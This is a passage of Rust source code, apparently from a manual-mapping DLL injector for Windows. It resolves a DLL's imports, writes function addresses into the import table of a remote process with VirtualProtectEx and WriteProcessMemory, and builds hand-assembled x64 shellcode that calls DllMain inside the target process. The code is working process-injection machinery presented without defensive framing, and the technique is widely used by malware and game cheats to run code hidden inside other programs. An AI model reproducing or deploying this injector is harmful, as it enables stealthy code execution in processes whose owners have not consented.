                    func_addr = proc.map(|p| p as usize).unwrap_or(0);
                } else {
                    // Import by name: thunk_val is RVA to IMAGE_IMPORT_BY_NAME
                    let hint_name_rva = thunk_val as usize;
                    let hint_name_off = rva_to_file_offset(dll_bytes, hint_name_rva).unwrap_or(0);
                    if hint_name_off == 0 || hint_name_off + 2 >= dll_bytes.len() {
                        thunk_idx += 1;
                        continue;
                    }
                    // Skip 2-byte Hint, read null-terminated name
                    let name_start = hint_name_off + 2;
                    let name_end = dll_bytes[name_start..]
                        .iter()
                        .position(|&b| b == 0)
                        .unwrap_or(0);
                    let func_name = &dll_bytes[name_start..name_start + name_end];
                    let mut func_name_cstr = func_name.to_vec();
                    func_name_cstr.push(0);

                    let proc = WinGetProcAddress(
                        dep_module,
                        windows::core::PCSTR(func_name_cstr.as_ptr()),
                    );
                    func_addr = proc.map(|p| p as usize).unwrap_or(0);
                }

                // Write resolved address to IAT in remote process
                if func_addr != 0 {
                    let iat_entry_addr = remote_base + first_thunk + thunk_idx * 8;
                    let addr_bytes = (func_addr as u64).to_le_bytes();

                    let mut old_prot = PAGE_PROTECTION_FLAGS(0);
                    let _ = VirtualProtectEx(
                        handle,
                        iat_entry_addr as *mut _,
                        8,
                        PAGE_READWRITE,
                        &mut old_prot,
                    );
                    WriteProcessMemory(
                        handle,
                        iat_entry_addr as *const _,
                        addr_bytes.as_ptr() as *const _,
                        8,
                        None,
                    )
                    .ok();
                    let _ = VirtualProtectEx(
                        handle,
                        iat_entry_addr as *mut _,
                        8,
                        old_prot,
                        &mut old_prot,
                    );
                    count += 1;
                }

                thunk_idx += 1;
            }
        }

        desc_off += 20;
    }

    Ok(count)
}

/// Build x64 trampoline that calls DllMain(hModule, DLL_PROCESS_ATTACH, NULL)
fn build_dllmain_trampoline(module_base: u64, entry_point: u64) -> Vec<u8> {
    let mut sc = Vec::with_capacity(64);
    // sub rsp, 0x28 (shadow space + alignment)
    sc.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);
    // mov rcx, module_base (hinstDLL)
    sc.extend_from_slice(&[0x48, 0xB9]);
    sc.extend_from_slice(&module_base.to_le_bytes());
    // mov edx, 1 (DLL_PROCESS_ATTACH)
    sc.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]);
    // xor r8, r8 (lpvReserved = NULL)
    sc.extend_from_slice(&[0x4D, 0x31, 0xC0]);
    // mov rax, entry_point
    sc.extend_from_slice(&[0x48, 0xB8]);
    sc.extend_from_slice(&entry_point.to_le_bytes());
    // call rax
    sc.extend_from_slice(&[0xFF, 0xD0]);
    // add rsp, 0x28
    sc.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);
    // xor eax, eax
    sc.extend_from_slice(&[0x31, 0xC0]);
    // ret
    sc.push(0xC3);
    sc
}

/// Convert RVA to file offset using section headers
fn rva_to_file_offset(dll_bytes: &[u8], rva: usize) -> Option<usize> {
    if rva == 0 {
        return None;
    }
    let e_lfanew = read_u32(dll_bytes, 0x3C) as usize;
    let file_hdr = e_lfanew + 4;
    let num_sections = read_u16(dll_bytes, file_hdr + 2) as usize;
    let opt_hdr_size = read_u16(dll_bytes, file_hdr + 16) as usize;
    let sections_off = file_hdr + 20 + opt_hdr_size;

    for i in 0..num_sections {
        let sh = sections_off + i * 40;
        if sh + 40 > dll_bytes.len() {
            return None;
        }
        let virt_addr = read_u32(dll_bytes, sh + 12) as usize;
        let raw_size = read_u32(dll_bytes, sh + 16) as usize;
        let raw_ptr = read_u32(dll_bytes, sh + 20) as usize;
        let virt_size = read_u32(dll_bytes, sh + 8) as usize;

        let section_size = if virt_size > 0 { virt_size } else { raw_size };
        if rva >= virt_addr && rva < virt_addr + section_size {
            return Some(raw_ptr + (rva - virt_addr));
        }
    }

    // If RVA is within headers
    let size_of_headers = read_u32(dll_bytes, e_lfanew + 24 + 60) as usize;
    if rva < size_of_headers {
        return Some(rva);
    }

    None
}

/// Map PE section characteristics to memory protection flags
fn section_characteristics_to_protection(
    characteristics: u32,
) -> windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS {
    use windows::Win32::System::Memory::*;
    let exec = characteristics & 0x20000000 != 0; // IMAGE_SCN_MEM_EXECUTE
    let read = characteristics & 0x40000000 != 0; // IMAGE_SCN_MEM_READ
    let write = characteristics & 0x80000000 != 0; // IMAGE_SCN_MEM_WRITE

    match (exec, read, write) {
        (true, true, true) => PAGE_EXECUTE_READWRITE,
        (true, true, false) => PAGE_EXECUTE_READ,
        (true, false, true) => PAGE_EXECUTE_READWRITE,
        (true, false, false) => PAGE_EXECUTE,
        (false, true, true) => PAGE_READWRITE,
        (false, true, false) => PAGE_READONLY,
        (false, false, true) => PAGE_READWRITE,
        (false, false, false) => PAGE_READONLY,
    }
}

fn read_u16(data: &[u8], offset: usize) -> u16 {
    u16::from_le_bytes([data[offset], data[offset + 1]])
}

fn read_u32(data: &[u8], offset: usize) -> u32 {
    u32::from_le_bytes([
        data[offset],
        data[offset + 1],
        data[offset + 2],
        data[offset + 3],
    ])
}

fn read_u64(data: &[u8], offset: usize) -> u64 {
    u64::from_le_bytes([
        data[offset],
        data[offset + 1],
        data[offset + 2],
        data[offset + 3],
        data[offset + 4],
        data[offset + 5],
        data[offset + 6],
        data[offset + 7],
    ])
}
